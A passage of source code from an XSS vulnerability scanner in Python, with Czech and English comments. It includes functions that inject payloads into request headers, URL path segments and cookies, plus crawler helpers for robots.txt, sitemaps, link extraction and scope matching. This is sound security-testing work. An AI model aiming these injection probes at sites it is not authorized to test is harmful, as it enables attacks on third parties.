            # Payload musí být v odpovědi...
            reflected = (
                payload in body
                or header_safe in body
                or escape(payload) in body
                or escape(header_safe) in body
            )
            if not reflected:
                continue

            # ...A NESMÍ být v baseline
            already_in_baseline = (
                payload in baseline_text
                or header_safe in baseline_text
                or escape(payload) in baseline_text
                or escape(header_safe) in baseline_text
            )
            if already_in_baseline:
                logging.debug(f"[HDR-FP] {url} {header} — payload v baseline, skip")
                continue

            # Odpověď musí být obsahově odlišná od baseline
            if body == baseline_text:
                logging.debug(f"[HDR-FP] {url} {header} — response identical to baseline, skip")
                continue

            logging.info(f"\033[91m[HEADER-XSS] {url} header:{header}\033[0m")
            yield {
                "url": url,
                "header": header,
                "method": "HEADER",
                "status": r.status_code,
                "response_len": len(body),
            }
        except _NET_EXCEPTIONS as e:
            logging.debug(f"Header inject {url} header:{header}: {e}")
            continue


# v10.16: Path-segment a Cookie injekce — dvě slepá místa stávajícího
# scanneru. Path: frameworky (Express :id, Flask <name>, Spring @PathVariable)
# reflektují segmenty cesty do 404/breadcrumb/„not found: /xxx" stránek.
# Cookie: aplikace reflektují cookie hodnoty (theme/lang/„welcome back")
# bez escapu. Obojí je pasivní GET třída jako inject_headers.

def _path_baseline(session, url: str, timeout: float,
                   follow_redirects: bool) -> Optional[str]:
    """Baseline pro path injekci — stáhne URL s benigním segmentem, aby se
    odfiltrovaly statické 404 šablony, které obsahují payload náhodou."""
    try:
        p = urlparse(url)
        base_path = p.path if p.path.endswith("/") else p.path + "/"
        probe = urlunparse(p._replace(path=base_path + "xsgsbaseline123",
                                      query="", fragment=""))
        r = session.get(probe, timeout=timeout, allow_redirects=follow_redirects)
        return r.text or ""
    except _NET_EXCEPTIONS:
        return None


def inject_path(session, url, payload, timeout, follow_redirects=True,
                baseline_text: Optional[str] = None):
    """Testuj XSS injekcí do POSLEDNÍHO segmentu cesty URL.

    Pošle payload jako přidaný path segment (…/path/<payload>), zkontroluje
    reflexi v odpovědi a srovná s baseline (benigní segment) — odfiltruje
    statické 404 šablony, které jen vypisují celou cestu safe-escaped.

    Generátor yieldje: {"url", "param": "URL-path", "method": "PATH",
                        "status", "response_len"}.
    """
    try:
        p = urlparse(url)
    except Exception:
        return
    if p.scheme not in ("http", "https"):
        return

    # Baseline (benigní segment) — pro FP filtr
    if baseline_text is None:
        baseline_text = _path_baseline(session, url, timeout, follow_redirects)
        if baseline_text is None:
            return

    from urllib.parse import quote
    base_path = p.path if p.path.endswith("/") else p.path + "/"
    # Path segment musí být URL-quoted, ale necháme reflektovatelné znaky
    # (<>"') projít — server je dekóduje a (pokud zranitelný) vypíše raw.
    seg = quote(payload, safe="<>\"'=()/;:")
    inj_path = base_path + seg
    test_url = urlunparse(p._replace(path=inj_path, query="", fragment=""))

    try:
        r = session.get(test_url, timeout=timeout,
                        allow_redirects=follow_redirects)
        body = r.text or ""
    except _NET_EXCEPTIONS as e:
        logging.debug(f"Path inject {url}: {e}")
        return

    # v10.16 FP-fix: hit JEN při RAW (neescapované) reflexi — escapovaná
    # reflexe (&lt;script&gt;) je BEZPEČNÁ, ne zranitelnost. Proto NEhledáme
    # escape(payload), na rozdíl od query-param fáze (tam má escapovaná
    # reflexe smysl jako kandidát pro context-aware bypass; tady ne).
    reflected = payload in body
    if not reflected:
        return
    # FP filtr: payload nesmí být v baseline + odpověď se musí lišit
    if payload in baseline_text:
        logging.debug(f"[PATH-FP] {url} — payload v baseline, skip")
        return
    if body == baseline_text:
        return

    logging.info(f"\033[91m[PATH-XSS] {test_url}\033[0m")
    yield {
        "url": test_url,
        "param": "URL-path",
        "method": "PATH",
        "status": r.status_code,
        "response_len": len(body),
    }


# Cookie jména, která aplikace nejčastěji reflektují zpět do stránky.
INJECTABLE_COOKIES = [
    "theme", "lang", "language", "locale", "currency", "country",
    "region", "view", "layout", "sort", "redirect", "returnurl",
    "username", "user", "name", "ref", "referrer", "last_page",
    "session_name", "display", "tz", "timezone",
]


def _cookie_baseline(session, url: str, timeout: float,
                     follow_redirects: bool) -> Optional[str]:
    """Baseline bez injektovaných cookies — pro FP filtr."""
    try:
        r = session.get(url, timeout=timeout, allow_redirects=follow_redirects)
        return r.text or ""
    except _NET_EXCEPTIONS:
        return None


def inject_cookies(session, url, payload, timeout, follow_redirects=True,
                   baseline_text: Optional[str] = None,
                   only_cookies: Optional[List[str]] = None):
    """Testuj XSS reflexí hodnoty cookie zpět do stránky.

    Pro každé cookie jméno z INJECTABLE_COOKIES (nebo only_cookies) pošle
    request s payloadem v hodnotě té cookie, zkontroluje reflexi + baseline.
    Reflektovaný cookie XSS vyžaduje cookie-set vektor pro exploitaci, ale
    je to reálný nález (aplikace echo-uje cookie bez escapu).

    Generátor yieldje: {"url", "param": "cookie:<name>", "method": "COOKIE",
                        "status", "response_len"}.

    POZN.: neposílá payload přes session.cookies (to by leaklo do dalších
    requestů); posílá ho jednorázově přes Cookie hlavičku tohoto requestu.
    """
    if baseline_text is None:
        baseline_text = _cookie_baseline(session, url, timeout, follow_redirects)
        if baseline_text is None:
            return

    cookie_safe = payload.encode("latin-1", errors="replace").decode("latin-1")
    cookies_to_test = only_cookies if only_cookies else INJECTABLE_COOKIES

    for cname in cookies_to_test:
        try:
            r = session.get(
                url, timeout=timeout, allow_redirects=follow_redirects,
                headers={"Cookie": f"{cname}={cookie_safe}"},
            )
            body = r.text or ""
            # v10.16 FP-fix: jen RAW reflexe (escapovaná = bezpečná).
            reflected = (payload in body or cookie_safe in body)
            if not reflected:
                continue
            if (payload in baseline_text or cookie_safe in baseline_text):
                logging.debug(f"[COOKIE-FP] {url} {cname} — v baseline, skip")
                continue
            if body == baseline_text:
                continue
            logging.info(f"\033[91m[COOKIE-XSS] {url} cookie:{cname}\033[0m")
            yield {
                "url": url,
                "param": f"cookie:{cname}",
                "method": "COOKIE",
                "status": r.status_code,
                "response_len": len(body),
            }
        except _NET_EXCEPTIONS as e:
            logging.debug(f"Cookie inject {url} cookie:{cname}: {e}")
            continue
 
 
# ---------- Crawler ----------
def normalize_url_for_crawl(u: str) -> str:
    """
    Normalizuje URL pro deduplikaci v crawleru:
    - lowercase scheme/host
    - strip default porty (80/443)
    - strip trailing slash (kromě rootu)
    - strip fragment
    - sort query parametrů (aby ?a=1&b=2 == ?b=2&a=1)
    - odstraní tracking parametry (utm_*, fbclid, gclid, ref)
    """
    # v10.77: NEVER let a single malformed link abort the whole crawl. urlparse
    # succeeds, but accessing `.port` raises ValueError for an out-of-range /
    # non-numeric port (e.g. a link to http://host:99999/ or a templated
    # href="http://host:${port}/"). The old unguarded `.port` propagated out of
    # crawl_site() and dropped every discovered page + finding from that run.
    try:
        p = urlparse(u)
        scheme = (p.scheme or "http").lower()
        host = (p.hostname or "").lower()
        try:
            pnum = p.port
        except ValueError:
            pnum = None   # malformed port → treat as no explicit port
        port = f":{pnum}" if pnum and pnum not in (80, 443) else ""
        path = p.path or "/"
        if path != "/" and path.endswith("/"):
            path = path.rstrip("/")

        # Sort + filter query parametrů pro lepší deduplikaci
        if p.query:
            params = parse_qsl(p.query, keep_blank_values=True)
            # Odstraň tracking parametry
            #
            # v10.89: `ref` REMOVED from this set. The normalized URL is not just
            # a dedup key — it is what the crawler actually requests (`_push`
            # takes it) — so every name listed here is deleted from the outgoing
            # request. The utm_*/fbclid/gclid/mc_* names are unambiguously
            # tracking, but `ref` is a perfectly ordinary application parameter
            # ("?ref=partner" selecting page content, and an injectable sink in
            # its own right). Stripping it meant `/p?ref=a` and `/p?ref=b`
            # collapsed to one page and the scan target `/search?ref=x` was
            # fetched as `/search`.
            TRACKING = {"utm_source", "utm_medium", "utm_campaign", "utm_term",
                        "utm_content", "fbclid", "gclid", "mc_eid", "mc_cid"}
            params = [(k, v) for k, v in params if k.lower() not in TRACKING]
            params.sort()
            query = urlencode(params)
        else:
            query = ""

        return urlunparse((scheme, host + port, path, "", query, ""))
    except Exception:
        # last-resort: a malformed URL must skip normalization, not crash the crawl
        return u


# ---------- Crawler helpers ----------

# Content-types, které má smysl stahovat (crawler)
# v10.87: JSON added. API responses are a dense source of endpoints (HAL/JSON:API
# `_links`, `href`/`url` fields, pagination `next`), and the crawler used to drop
# every one of them on the content-type gate — so a JSON-driven app exposed
# almost no surface. See _extract_links_from_json.
_CRAWLABLE_CONTENT_TYPES = ("text/html", "application/xhtml", "application/xml",
                            "text/xml", "application/json", "+json")

# v10.89: content-types that mean "unknown", not "binary". A 2xx HEAD carrying
# one of these is not trustworthy enough to skip a URL on — see _fetch_page.
_GENERIC_CONTENT_TYPES = ("application/octet-stream", "binary/octet-stream")
# …but do not download a multi-MB blob just to discover it really was binary.
_HEAD_UNKNOWN_MAX_BYTES = 2 * 1024 * 1024

# v10.89: hard ceiling on a crawled response body. A plain `session.get()`
# buffers the WHOLE body into memory before the caller gets a say, so a hostile
# or merely broken endpoint — an endlessly generated stream, a multi-GB export
# served as text/html — could exhaust the scanner. The HTTP timeout does not
# help here: it bounds the gap between bytes, not the total. 8 MB is far above
# any real HTML page, and a truncated body still parses (BeautifulSoup handles
# partial markup) so the crawl degrades instead of dying.
_MAX_RESPONSE_BYTES = 8 * 1024 * 1024
_RESPONSE_CHUNK = 64 * 1024

# Přípony souborů, které NIKDY nestahovat
_SKIP_EXTENSIONS = {
    ".pdf", ".zip", ".tar", ".gz", ".rar", ".7z",
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp", ".svg", ".ico",
    ".mp3", ".mp4", ".avi", ".mov", ".webm", ".wmv", ".flv",
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".exe", ".dmg", ".pkg", ".deb", ".rpm",
    ".css", ".woff", ".woff2", ".ttf", ".eot",
}


# v10.89: how many URLs sharing ONE endpoint signature stay in the normal
# priority tier before the rest are spilled behind everything else. Spilled
# URLs are still crawled if budget remains — this reorders, it does not drop.
_ENDPOINT_TIER_LIMIT = 3
_ENDPOINT_SPILL_PRIORITY = 10
_RE_NUMERIC_SEGMENT = re.compile(r"^\d+$")


def _endpoint_signature(u: str) -> Tuple[str, str, Tuple[str, ...]]:
    """Collapse a URL to the ENDPOINT it exercises.

    The scanner already does this AFTER the crawl (see the endpoint-dedup pass
    that turned example.org's 1583 articles into 2 endpoints), but the crawl queue
    itself had no such notion — so the whole max_pages budget was spent on one
    template and the rest of the site was never seen. v10.88 made that worse by
    ranking ?param URLs first: those are exactly the ones a listing page emits
    by the thousand.

    Path segments that are purely numeric are templated too, so `/clanek/1` …
    `/clanek/1583` collapse the same way — that is the shape modern sites use.
    ONLY all-digit segments collapse: `v1`, `2024-report` and every slug stay
    distinct, so genuinely separate sections are never merged.
    """
    try:
        p = urlparse(u)
        segs = ["{n}" if _RE_NUMERIC_SEGMENT.match(s) else s
                for s in (p.path or "/").split("/")]
        keys = tuple(sorted(parse_qs(p.query, keep_blank_values=True).keys()))
        return (p.netloc.lower(), "/".join(segs), keys)
    except Exception:
        return (u, "", ())


def _should_skip_by_extension(url: str) -> bool:
    """Rychlý test jestli URL má neskenovatelnou příponu."""
    path = urlparse(url).path.lower()
    for ext in _SKIP_EXTENSIONS:
        if path.endswith(ext):
            return True
    return False


# v10.88: `<meta charset=…>` and the legacy
# `<meta http-equiv="Content-Type" content="…; charset=…">` — both forms carry
# `charset=` inside the tag, so one pattern covers them.
_META_CHARSET_RX = re.compile(
    rb"""<meta[^>]+charset\s*=\s*["']?\s*([a-zA-Z0-9_.:\-]+)""", re.I)
_CT_CHARSET_RX = re.compile(r"""charset\s*=\s*["']?\s*([a-zA-Z0-9_.:\-]+)""", re.I)
_BOM_UTF8 = b"\xef\xbb\xbf"


def _decode_response(r, raw: Optional[bytes] = None) -> str:
    """v10.88: decode a response body using the encoding actually declared.

    `requests` follows RFC 2616 and falls back to ISO-8859-1 for ANY `text/*`
    response whose Content-Type carries no `charset` — very common — so a UTF-8
    page decodes to mojibake. For a scanner that is not cosmetic: the corrupted
    text is what link extraction, `page_html_sink` and every downstream
    reflection comparison then run on, so the crawler queues URLs that do not
    exist (`/hledÃ¡nÃ­` instead of `/hledání`) and payload matching runs against
    garbage.

    Order of trust: explicit header charset → BOM → `<meta charset>` → strict
    UTF-8 (self-validating, so a clean decode is strong evidence) → whatever
    requests guessed. Never raises: worst case it returns the old `r.text`.
    """
    # v10.89: `raw` lets a caller that already read the body under a byte
    # ceiling (see _fetch_page) hand those exact bytes in, instead of this
    # function pulling an unbounded `r.content` of its own.
    if raw is None:
        try:
            raw = r.content or b""
        except Exception:
            try:
                return r.text or ""
            except Exception:
                return ""
    if not raw:
        return ""

    # 1. The server was explicit — trust the header over the document, exactly
    #    as a browser does. Decoded here rather than deferring to `r.text` so the
    #    behaviour is independent of the requests version.
    ctype = (r.headers.get("Content-Type") or "").lower()
    hm = _CT_CHARSET_RX.search(ctype)
    if hm:
        try:
            return raw.decode(hm.group(1).strip("\"' "))
        except (UnicodeDecodeError, LookupError):
            pass        # header lies / unknown codec → fall through to sniffing

    # 2. BOM, then 3. an in-document <meta charset>.
    declared = None
    if raw.startswith(_BOM_UTF8):
        declared = "utf-8-sig"
    else:
        m = _META_CHARSET_RX.search(raw[:4096])
        if m:
            cand = m.group(1).decode("ascii", "ignore").strip().lower()
            # A page may declare utf8/UTF_8; python needs a codec name it knows.
            if cand:
                declared = cand

    # 4. Declared encoding, then strict UTF-8. A strict UTF-8 decode that
    #    succeeds on non-ASCII bytes is near-conclusive (UTF-8 is
    #    self-validating), and for pure ASCII every candidate agrees anyway.
    for candidate in (declared, "utf-8"):
        if not candidate:
            continue
        try:
            return raw.decode(candidate)
        except (UnicodeDecodeError, LookupError):
            continue

    # 5. Statistical guess (chardet/charset_normalizer) — e.g. real windows-1250
    #    that declares nothing. Only reached when the bytes are NOT valid UTF-8.
    try:
        ap = r.apparent_encoding
        if ap:
            return raw.decode(ap, "replace")
    except Exception:
        pass
    try:
        return r.text or ""
    except Exception:
        return raw.decode("utf-8", "replace")


def _compile_robots_pattern(pat: str) -> "re.Pattern":
    """`*` = any run of characters, `$` = end-of-path anchor. Everything else
    is literal — robots patterns are not regexes."""
    anchored = pat.endswith("$")
    body = pat[:-1] if anchored else pat
    rx = ".*".join(re.escape(seg) for seg in body.split("*"))
    return re.compile("^" + rx + ("$" if anchored else ""))


class _RobotsRules:
    """Parsed robots.txt rules for one user-agent group.

    v10.89: this used to be a bare `Set[str]` of Disallow prefixes matched with
    `str.startswith`. That ignored `Allow:` completely — a site using the
    standard `Disallow: /` + `Allow: /public/` shape was skipped in FULL — and
    treated `*` / `$` as literal characters, so `Disallow: /*.php$` silently
    matched nothing. Those gaps did not show while the robots path was a no-op
    (disallowed URLs used to consume the crawl budget, so the crawl died long
    before matching quality mattered); now that it works, they decide coverage.

    Matching follows the Google robots spec: the LONGEST matching pattern wins,
    `Allow` wins a tie, and no match at all means allowed.
    """
    __slots__ = ("rules", "n_disallow")

    def __init__(self, rules: "List[Tuple[str, re.Pattern, bool]]"):
        self.rules = rules
        self.n_disallow = sum(1 for _p, _rx, allow in rules if not allow)

    def __len__(self) -> int:
        return len(self.rules)

    def __bool__(self) -> bool:
        return bool(self.rules)

    def allows(self, path: str) -> bool:
        best_len, best_allow = -1, True
        for pat, rx, allow in self.rules:
            if rx.match(path):
                plen = len(pat)
                if plen > best_len or (plen == best_len and allow):
                    best_len, best_allow = plen, allow
        return best_allow


def _parse_robots_txt(text: str, user_agent: str = "*") -> _RobotsRules:
    """Group rules by User-agent and keep the block that applies to us.

    Consecutive `User-agent:` lines share one rule block (per the spec); the
    first Allow/Disallow closes the header, so the next `User-agent:` starts a
    fresh group.
    """
    ua_want = (user_agent or "*").lower()
    groups: "Dict[str, List[Tuple[str, bool]]]" = {}
    current: List[str] = []
    fresh_group = True
    for line in (text or "").splitlines():
        line = line.split("#", 1)[0].strip()
        if not line or ":" not in line:
            continue
        field, _, value = line.partition(":")
        field = field.strip().lower()
        value = value.strip()
        if field == "user-agent":
            if not fresh_group:
                current = []
                fresh_group = True
            if value:
                current.append(value.lower())
            continue
        if field not in ("allow", "disallow") or not current:
            continue
        fresh_group = False
        # `Disallow:` with an EMPTY value is the explicit "allow everything";
        # it constrains nothing, so it needs no rule.
        if not value:
            continue
        for ua in current:
            groups.setdefault(ua, []).append((value, field == "allow"))
    # A group naming us specifically overrides the wildcard group entirely.
    picked = groups.get(ua_want) or groups.get("*") or []
    out: "List[Tuple[str, re.Pattern, bool]]" = []
    for pat, allow in picked:
        try:
            out.append((pat, _compile_robots_pattern(pat), allow))
        except re.error:
            continue        # an unparseable pattern must not break the crawl
    return _RobotsRules(out)


def _fetch_robots_txt(session: requests.Session, base_url: str,
                      timeout: float = 6.0,
                      user_agent: str = "*") -> Optional[_RobotsRules]:
    """
    Stáhne robots.txt a vrátí parsovaná pravidla (Allow i Disallow).
    Na chybu vrací None.
    """
    try:
        p = urlparse(base_url)
        robots_url = urlunparse((p.scheme, p.netloc, "/robots.txt", "", "", ""))
        r = session.get(robots_url, timeout=timeout, allow_redirects=True)
        if r.status_code != 200:
            return None
        return _parse_robots_txt(_decode_response(r), user_agent)
    except Exception:
        return None


_SITEMAP_LOC_RX = re.compile(r"<loc>\s*([^<\s][^<]*?)\s*</loc>", re.I)
_SITEMAP_IN_ROBOTS_RX = re.compile(r"^\s*sitemap\s*:\s*(\S+)", re.I | re.M)


def _fetch_sitemap_urls(session: requests.Session, base_url: str, base_host: str,
                        timeout: float = 6.0, max_urls: int = 500,
                        robots_text: str = "") -> List[str]:
    """v10.87: seed the crawl from sitemap.xml.

    A sitemap is the site telling you its own URL space. Nothing in the scanner
    read one, so on a large site the crawler had to rediscover everything by
    following links — and anything not linked from the crawled depth was simply
    never scanned. Cheap, high-yield, and the one discovery source that is
    explicitly published for consumption.

    Follows sitemap-index files one level down, keeps only in-scope URLs, and
    is fail-soft: any error just yields fewer seeds, never breaks the crawl.
    """
    seeds: List[str] = []
    seen_maps: Set[str] = set()

    def _candidates() -> List[str]:
        p = urlparse(base_url)
        out = [urlunparse((p.scheme, p.netloc, path, "", "", "")) for path in
               ("/sitemap.xml", "/sitemap_index.xml", "/sitemap-index.xml")]
        txt = robots_text
        if not txt:
            # robots.txt is tiny; fetching it here keeps this function
            # self-contained rather than threading shared state through.
            try:
                rr = session.get(
                    urlunparse((p.scheme, p.netloc, "/robots.txt", "", "", "")),
                    timeout=timeout, allow_redirects=True)
                txt = rr.text if rr.status_code == 200 else ""
            except Exception:
                txt = ""
        # `Sitemap:` lines in robots.txt are authoritative — prefer them.
        for m in _SITEMAP_IN_ROBOTS_RX.finditer(txt or ""):
            u = m.group(1).strip()
            if u.startswith(("http://", "https://")):
                out.insert(0, u)
        return out

    def _read(url: str, depth: int) -> None:
        if len(seeds) >= max_urls or depth > 1 or url in seen_maps:
            return
        seen_maps.add(url)
        try:
            r = session.get(url, timeout=timeout, allow_redirects=True)
            if r.status_code != 200:
                return
            body = _decode_response(r)      # v10.88: non-ASCII <loc> values
        except Exception:
            return
        if "<" not in body:
            return
        is_index = "<sitemapindex" in body[:4000].lower()
        for m in _SITEMAP_LOC_RX.finditer(body):
            if len(seeds) >= max_urls:
                return
            loc = unescape(m.group(1).strip())
            if not loc.startswith(("http://", "https://")):
                continue
            try:
                if not _hosts_match(urlparse(loc).hostname or "", base_host):
                    continue
            except ValueError:
                continue
            if is_index:
                _read(loc, depth + 1)          # nested sitemap file
            elif not _should_skip_by_extension(loc):
                seeds.append(loc)

    for cand in _candidates():
        if len(seeds) >= max_urls:
            break
        _read(cand, 0)
    return seeds


def _is_allowed_by_robots(url: str, rules) -> bool:
    """Smí crawler načíst `url`? Fail-open — nejasnost nesmí zabít crawl."""
    if not rules:
        return True
    try:
        p = urlparse(url)
        # robots patterns are matched against path + query, so a rule like
        # `Disallow: /*?print=` can do its job.
        path = p.path or "/"
        if p.query:
            path = f"{path}?{p.query}"
    except ValueError:
        return True
    if isinstance(rules, (set, frozenset, list, tuple)):
        # legacy shape: a bare collection of Disallow prefixes
        return not any(path.startswith(d) for d in rules)
    try:
        return rules.allows(path)
    except Exception:
        return True


# v10.87: attributes that carry a request URL for htmx / Unpoly / Hotwire.
# The project already DETECTS htmx attribute-injection XSS (_htmx_alpine.py), but
# the crawler could not find an htmx endpoint to hand it — `hx-get="/frag?u=1"`
# is a real, parameterised endpoint that appears in no <a href> anywhere.
_JSON_URL_KEYS = ("href", "url", "link", "self", "next", "prev", "first",
                  "last", "uri", "endpoint", "path", "location")


def _extract_links_from_json(body: str, base_url: str, base_host: str,
                             max_urls: int = 200,
                             param_sink: Optional[set] = None) -> Tuple[List[str], int]:
    """v10.87: mine URLs out of a JSON API response.

    Walks the structure and collects string values that look like URLs, either
    because their KEY is a known link key (HAL/JSON:API `_links`, `href`, `next`,
    …) or because the value itself is an absolute in-scope URL. Deliberately
    conservative: a bare relative string under an unknown key is NOT treated as
    a URL, which would turn every id/label into a phantom endpoint.
    """
    links: List[str] = []
    param_count = 0
    try:
        data = json.loads(body)
    except (ValueError, TypeError):
        return links, param_count

    seen: Set[str] = set()

    def _consider(raw: str, key_is_linkish: bool) -> None:
        nonlocal param_count
        if len(links) >= max_urls or not isinstance(raw, str):
            return
        s = raw.strip()
        if not s or len(s) > 2048 or s.startswith(("javascript:", "data:", "mailto:")):
            return
        is_abs = s.startswith(("http://", "https://"))
        if not is_abs:
            # only trust a relative value when the key says it is a link
            if not key_is_linkish or not s.startswith("/"):
                return
            try:
                s = requests.compat.urljoin(base_url, s)
            except (ValueError, TypeError):
                return
        try:
            p = urlparse(s)
        except ValueError:
            return
        if not _hosts_match(p.hostname or "", base_host):
            return
        u = urlunparse(p._replace(fragment=""))
        if u in seen or _should_skip_by_extension(u):
            return
        seen.add(u)
        links.append(u)
        if p.query:
            param_count += 1
            if param_sink is not None:      # v10.91 — see _extract_links
                param_sink.add(u)

    def _walk(node, key_is_linkish: bool, depth: int) -> None:
        if depth > 12 or len(links) >= max_urls:
            return
        if isinstance(node, dict):
            for k, v in node.items():
                _walk(v, str(k).lower().lstrip("_") in _JSON_URL_KEYS, depth + 1)
        elif isinstance(node, list):
            for v in node:
                _walk(v, key_is_linkish, depth + 1)
        elif isinstance(node, str):
            _consider(node, key_is_linkish)

    _walk(data, False, 0)
    return links, param_count


_REQUEST_URL_ATTRS = ("hx-get", "hx-post", "hx-put", "hx-patch", "hx-delete",
                      "data-hx-get", "data-hx-post",
                      "up-href", "data-turbo-action")

# Tags whose src/data attribute is a fetchable same-origin resource.
_SRC_URL_TAGS = (("iframe", "src"), ("frame", "src"),
                 ("object", "data"), ("embed", "src"))

_META_REFRESH_RX = re.compile(r"""url\s*=\s*['"]?([^'";]+)""", re.I)


def _extract_links(html: str, base_url: str, base_host: str,
                   param_sink: Optional[set] = None) -> Tuple[List[str], int]:
    """
    Vytáhne odkazy ze stránky. Vrací (links, param_count).
    param_count = kolik URL má query parametry (kandidáti na XSS).

    v10.87: honours <base href> and mines the request-URL carriers a plain
    <a href> sweep misses (formaction, htmx attrs, meta refresh).
    """
    links: List[str] = []
    param_count = 0
    # v10.89: a page repeats its nav on every template, so the same href was
    # appended dozens of times and counted into `param_count` each time —
    # `stats['params_found']` reported a multiple of the real number. Dedup here
    # (order preserved), which also shortens the enqueue loop.
    seen_links: Set[str] = set()
    try:
        soup = BeautifulSoup(html, "html.parser")
    except Exception:
        return links, param_count

    # ── v10.87: <base href> decides how EVERY relative URL on this page
    # resolves. Ignoring it was not merely a coverage gap — it produced WRONG
    # absolute URLs: with <base href="/app/v2/">, `href="page?q=1"` resolved to
    # /page?q=1, so the crawler fetched a URL that does not exist and never saw
    # the real one. Resolve exactly as a browser does.
    resolve_base = base_url
    try:
        base_el = soup.find("base", href=True)
        if base_el:
            bh = (base_el.get("href") or "").strip()
            if bh:
                cand = requests.compat.urljoin(base_url, bh)
                # A cross-origin <base> must not redirect our in-scope crawl.
                if _hosts_match(urlparse(cand).hostname or "", base_host):
                    resolve_base = cand
    except Exception:
        pass

    def _add(raw: str, *, always_param: bool = False,
             skip_schemes: Tuple[str, ...] = ("#", "javascript:", "mailto:",
                                              "tel:", "data:", "about:")) -> None:
        """Normalise one candidate URL and record it if it is in scope."""
        u = (raw or "").strip()
        if not u or u.startswith(skip_schemes):
            return
        if not u.startswith(("http://", "https://")):
            try:
                u = requests.compat.urljoin(resolve_base, u)
            except (ValueError, TypeError):
                return
        try:
            p = urlparse(u)
        except ValueError:      # malformed host, e.g. an unmatched '['
            return
        if not _hosts_match(p.hostname or "", base_host):
            return
        u = urlunparse(p._replace(fragment=""))
        if _should_skip_by_extension(u):
            return
        if u in seen_links:
            return
        seen_links.add(u)
        links.append(u)
        if always_param or p.query:
            nonlocal param_count
            param_count += 1
            # v10.91: let the caller count parameterised URLs uniquely across the
            # WHOLE crawl. `param_count` is per page, so a nav link present on
            # 200 pages was counted 200 times and `stats['params_found']` was a
            # multiple of the truth.
            if param_sink is not None:
                param_sink.add(u)

    # <a href>
    for a in soup.find_all("a", href=True):
        _add(a.get("href"))

    # <area href> — image maps are ordinary navigation
    for a in soup.find_all("area", href=True):
        _add(a.get("href"))

    # <iframe|frame src>, <object data>, <embed src>
    for tag_name, attr in _SRC_URL_TAGS:
        for el in soup.find_all(tag_name):
            if el.get(attr):
                _add(el.get(attr))

    # <form action> — i bez query, engine dál vyhodnotí
    for f in soup.find_all("form"):
        action = (f.get("action") or "").strip() or resolve_base
        _add(action, always_param=True)

    # v10.87: formaction on a submit control OVERRIDES the form's action, so it
    # is a distinct endpoint — and it is an XSS sink in its own right.
    for el in soup.find_all(["button", "input"]):
        if el.get("formaction"):
            _add(el.get("formaction"), always_param=True)

    # v10.87: htmx / Unpoly request attributes (see _REQUEST_URL_ATTRS).
    for el in soup.find_all(True):
        for attr in _REQUEST_URL_ATTRS:
            v = el.get(attr)
            if v:
                _add(v, always_param=True)

    # v10.87: <meta http-equiv="refresh" content="0;url=…"> is a navigation the
    # browser performs and the crawler used to drop.
    for m in soup.find_all("meta"):
        if (m.get("http-equiv") or "").strip().lower() != "refresh":
            continue
        mt = _META_REFRESH_RX.search(m.get("content") or "")
        if mt:
            _add(mt.group(1))

    return links, param_count


# v10.91: set True to restore the pre-v10.91 symmetric scope, where scanning a
# subdomain also pulled its PARENT domain into scope. Off by default — see
# _hosts_match. One-line revert if a target genuinely needs the wider net.
_SCOPE_INCLUDE_PARENT_DOMAIN = False


def _hosts_match(host: str, base_host: str) -> bool:
    """
    Tolerantní porovnání hostů pro crawler.
    Vrátí True pokud:
    - host == base_host
    - host je 'www.' verze base_host (nebo opačně)
    - host je subdoména base_host (nebo opačně)

    Příklady:
        _hosts_match('example.com', 'www.example.com') → True
        _hosts_match('www.example.com', 'example.com') → True
        _hosts_match('xss-game.appspot.com', 'xss-game.appspot.com') → True
        _hosts_match('blog.example.com', 'example.com') → True
        _hosts_match('example.com', 'blog.example.com') → False   # v10.91
        _hosts_match('attacker.com', 'example.com') → False

    v10.91: scope no longer widens UPWARD. Matching used to be symmetric
    (`b.endswith("." + h)`), so pointing the scanner at `blog.example.com` put
    `example.com` in scope too — a different application, on a domain the
    operator never named. For a tool that sends attack payloads that is an
    authorization question, not a coverage preference: the safe direction is to
    test less than was asked, never more. The operator can always scan the apex
    explicitly. `www.` is still normalised away in both directions, so the
    common `www.example.com` ⇄ `example.com` pair is unaffected.
    """
    if not host or not base_host:
        return False
    h = host.lower()
    b = base_host.lower()
    if h == b:
        return True
    # Strip www. z obou
    if h.startswith("www."):
        h = h[4:]
    if b.startswith("www."):
        b = b[4:]
    if h == b:
        return True
    # Subdoména cíle (směrem DOLŮ) je v rozsahu; rodičovská doména není.
    if h.endswith("." + b):
        return True
    if _SCOPE_INCLUDE_PARENT_DOMAIN and b.endswith("." + h):
        return True
    return False


def _fetch_page(session: requests.Session, url: str, timeout: float) -> Dict:
    """
    Stáhne jednu stránku. Vrací dict s klíči:
    - ok: bool
    - status: int
    - html: str (prázdný při chybě)
    - is_redirect: bool
    - skipped_reason: Optional[str]
    """
    result = {"ok": False, "status": 0, "html": "", "is_redirect": False,
              "skipped_reason": None, "truncated": False}
    try:
        # ── v10.91: ONE request per page, not two ────────────────────────────
        # There used to be a HEAD before every GET purely to read Content-Type.
        # Measured on a plain crawl: 2 HEAD : 2 GET — every page cost two round
        # trips. A streamed GET makes that pointless: with `stream=True` the
        # response HEADERS arrive and the body is NOT transferred until we ask
        # for it, so the same content-type gate can run on the real GET and we
        # close without reading a byte. That is strictly better than the HEAD —
        # one round trip instead of two, and the type we act on is the one the
        # GET actually returned rather than a HEAD that may disagree (or be an
        # error page, the v10.89 bug).
        _raw: Optional[bytes] = None
        _streamed = False
        try:
            r = session.get(url, timeout=timeout, allow_redirects=True, stream=True)
            _streamed = True
        except (TypeError, AttributeError):
            # session implementation without a `stream` kwarg (curl_cffi shim)
            r = session.get(url, timeout=timeout, allow_redirects=True)

        result["status"] = r.status_code
        result["is_redirect"] = bool(r.history)
        # v10.52: expose the response so the crawl loop can run the passive WAF
        # fingerprint + param extraction inline (no second fetch). Kept even for
        # 4xx — WAF challenge pages (403/429) carry the strongest signatures.
        result["resp"] = r

        ctype = (r.headers.get("Content-Type") or "").lower()
        _skip_ctype = None
        if ctype and not any(ct in ctype for ct in _CRAWLABLE_CONTENT_TYPES):
            # `application/octet-stream` is the "I have no idea" default rather
            # than a claim of binary content; plenty of servers emit it for a
            # perfectly ordinary HTML page. Read it anyway unless the declared
            # length says that would be an expensive way to find out.
            _generic = any(g in ctype for g in _GENERIC_CONTENT_TYPES)
            try:
                _clen = int(r.headers.get("Content-Length") or 0)
            except (TypeError, ValueError):
                _clen = 0
            if not _generic or _clen > _HEAD_UNKNOWN_MAX_BYTES:
                _skip_ctype = f"content-type: {ctype.split(';')[0]}"

